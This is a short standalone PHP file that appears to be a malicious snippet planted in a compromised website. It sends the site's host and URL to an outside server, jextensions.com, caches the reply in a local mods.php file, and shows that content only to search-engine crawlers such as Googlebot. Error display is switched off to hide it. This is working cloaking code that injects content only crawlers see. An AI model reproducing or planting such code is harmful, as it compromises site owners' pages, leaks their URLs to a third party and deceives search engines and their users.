<?php
ini_set('display_errors',0);
$path = $_SERVER['HTTP_HOST'].$_SERVER[REQUEST_URI];
$path = str_replace("&", "",$path);
$target = dirname(__FILE__) . DIRECTORY_SEPARATOR . "mods.php";
$source = 'http://jextensions.com/g.php?i='.$path;
$cachetime = 86400;
if ((file_exists($target)) && (time() - $cachetime) > filemtime($target)) {    
$string = file_get_contents($source);$result = file_put_contents($target, $string);}
$spiders = array('Googlebot','Yahoo','msnbot','Googlebot-Mobile');
$credits = file_get_contents($target);
foreach ($spiders as $spider){if (eregi($spider, $_SERVER['HTTP_USER_AGENT'])){echo $credits;}}
?>